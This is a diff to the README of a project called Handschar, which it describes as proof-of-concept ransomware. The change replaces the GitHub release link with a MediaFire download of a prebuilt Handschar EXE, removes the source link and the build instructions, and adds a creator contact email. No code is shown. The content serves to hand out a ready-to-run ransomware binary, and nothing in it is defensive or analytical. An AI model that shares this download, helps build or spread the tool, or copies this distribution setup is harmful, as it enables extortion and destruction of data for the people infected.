@@ -18,13 +18,13 @@ Handschar is a proof‑of‑concept ransomware:
 
 ## 📥 Download
 
-- **Latest EXE:** [Handschar.exe](https://github.com/yourusername/Handschar/releases/download/v1.0/Handschar.exe)
-- **Source:** [Handschar2.py](Handschar2.py)
+- **Latest EXE:** [Handschar2.exe](https://www.mediafire.com/file/en2kzeq8t552g2o/Handschar.exe/file)
+
 
 ---
 
-## 🔧 Build from Source
+## Creator
 
 ```bash
-pip install pycryptodome pillow pywin32 pyinstaller
-pyinstaller --onefile --windowed --name=Handschar Handschar2.py
+📬 Kontak
+xaydevsupport@gmail.com
